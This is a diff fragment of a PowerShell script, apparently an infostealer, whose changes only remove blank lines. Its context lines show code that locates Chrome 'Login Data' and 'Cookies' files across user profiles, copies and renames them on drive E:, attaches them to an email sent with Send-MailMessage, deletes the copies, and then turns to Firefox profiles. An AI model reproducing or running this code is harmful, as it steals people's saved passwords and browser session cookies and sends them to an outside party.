@@ -22,7 +22,6 @@ if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\
 	
 }
 
-
 if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Login` Data)
 {
 	$chrome1="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"
@@ -31,7 +30,6 @@ if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile`
 	Rename-Item E:\Login` Data ProfileLogin1
 	$Attachment2 = "E:\ProfileLogin1"
 }
-
 
 if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Cookies)
 {
@@ -50,8 +48,6 @@ if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile`
 	Rename-Item E:\Cookies Cookies1
 	$Attachment4 = "E:\Cookies1"
 }
-
-
 
 if($path1=1)
 {
@@ -88,8 +84,6 @@ Send-MailMessage -From $From -to $To -Subject $Subject `
 Remove-Item E:\Cookies1
 
 }
- 
-
 
 $MPath="C:\Users\"+$username+"\AppData\Local\Mozilla\Firefox\Profiles"
 if(Test-Path $MPath)
